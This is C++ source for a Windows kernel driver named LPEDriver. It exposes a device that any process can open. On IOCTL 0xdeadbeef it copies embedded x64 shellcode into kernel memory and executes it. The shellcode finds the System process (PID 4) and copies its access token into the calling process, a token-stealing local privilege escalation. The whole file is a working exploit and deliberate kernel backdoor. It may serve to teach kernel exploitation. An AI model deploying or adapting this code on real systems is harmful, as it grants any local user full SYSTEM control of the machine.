#include <ntddk.h>

#define DRIVER_TAG 'lped'

void LPEDriverUnload(_In_ PDRIVER_OBJECT DriverObject);
NTSTATUS LPEDriverCreateClose(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);
NTSTATUS LPEDriverPrivilegeEscalation(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);

unsigned char rawShellcode[] = {
		0x65, 0x48, 0x8b, 0x14, 0x25, 0x88, 0x01, 0x00, 0x00, 0x4c, 0x8b, 0x82,
		0xb8, 0x00, 0x00, 0x00, 0x49, 0x8b, 0x88, 0x48, 0x04, 0x00, 0x00, 0x48,
		0x8b, 0x51, 0xf8, 0x48, 0x83, 0xfa, 0x04, 0x74, 0x05, 0x48, 0x8b, 0x09,
		0xeb, 0xf1, 0x48, 0x8b, 0x41, 0x70, 0x24, 0xf0, 0x49, 0x89, 0x80, 0xb8,
		0x04, 0x00, 0x00, 0x4d, 0x31, 0xed, 0xc3
};

extern "C" NTSTATUS
DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) {
	UNREFERENCED_PARAMETER(RegistryPath);

	DriverObject->DriverUnload = LPEDriverUnload;
	DriverObject->MajorFunction[IRP_MJ_CREATE] = LPEDriverCreateClose;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = LPEDriverCreateClose;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = LPEDriverPrivilegeEscalation;
	
	UNICODE_STRING devName = RTL_CONSTANT_STRING(L"\\Device\\LPEDriver");
	PDEVICE_OBJECT DeviceObject;
	NTSTATUS status = IoCreateDevice(DriverObject, 0, &devName, FILE_DEVICE_UNKNOWN, 0, FALSE, &DeviceObject);
	if (!NT_SUCCESS(status)) {
		KdPrint(("Failed to create device (0x%08)\n", status));
		return status;
	}

	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\LPEDriver");
	status = IoCreateSymbolicLink(&symLink, &devName);
	if (!NT_SUCCESS(status)) {
		KdPrint(("Failed to create symbolic link (0x%08)\n", status));
		IoDeleteDevice(DeviceObject);
		return status;
	}
	
	KdPrint(("LPE driver initialized successfully\n"));
	
	return STATUS_SUCCESS;
}

void LPEDriverUnload(_In_ PDRIVER_OBJECT DriverObject) {
	UNREFERENCED_PARAMETER(DriverObject);

	// ExFreePool(g_RegistryPath.Buffer);
	KdPrint(("LPE driver Unload called\n"));
}

_Use_decl_annotations_
NTSTATUS LPEDriverCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
	UNREFERENCED_PARAMETER(DeviceObject);

	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);

	return STATUS_SUCCESS;
}

_Use_decl_annotations_
NTSTATUS LPEDriverPrivilegeEscalation(PDEVICE_OBJECT, _In_ PIRP Irp) {
	auto status = STATUS_SUCCESS;
	PIO_STACK_LOCATION irpSp = IoGetCurrentIrpStackLocation(Irp);
	ULONG ioctlCode = irpSp->Parameters.DeviceIoControl.IoControlCode;

	switch (ioctlCode) {
		case 0xdeadbeef:
			PVOID shellcodeMemory;
			ULONG shellcodeSize = sizeof(rawShellcode);
			void (*shellcodeFunc)(void);

			shellcodeMemory = ExAllocatePoolWithTag(NonPagedPool, shellcodeSize, DRIVER_TAG);

			if (shellcodeMemory != NULL) {
				RtlCopyMemory(shellcodeMemory, rawShellcode, shellcodeSize);

				shellcodeFunc = (void (*)(void))shellcodeMemory;
				shellcodeFunc();

				ExFreePoolWithTag(shellcodeMemory, DRIVER_TAG);
			}
	}

	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return status;
}